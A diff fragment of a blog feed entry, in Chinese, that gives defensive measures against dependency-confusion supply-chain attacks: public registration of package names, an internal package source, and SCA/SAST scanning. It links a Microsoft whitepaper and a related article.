+<h1 id="四-防范">四、防范</h1>
+<p>  1、对于第三方依赖包，均在外部公共库进行注册；<br>
+  2、维护内部源，维护依赖包列表，相关私有包只能从内部源中获取；<br>
+  3、对于从外部源获取的包，采用SCA进行扫描（不过现在市面上的SCA均是以比对漏洞库的形式检测，个人认为必要时可以采用SAST代替这部分的扫描任务）。<br>
+  <a href="https://azure.microsoft.com/zh-cn/resources/3-ways-to-mitigate-risk-using-private-package-feeds/">微软白皮书</a></p>
+<h1 id="五-杂谈">五、杂谈</h1>
+<p>  Dependency Confusion作为供应链攻击的一种，该漏洞已经影响了很多大厂<br>
+<img src="https://V-alkoinen.github.io/post-images/1642329462997.png" alt="" loading="lazy"><br>
+<a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">相关文章</a></p>
 ]]></content>
     </entry>
 </feed>
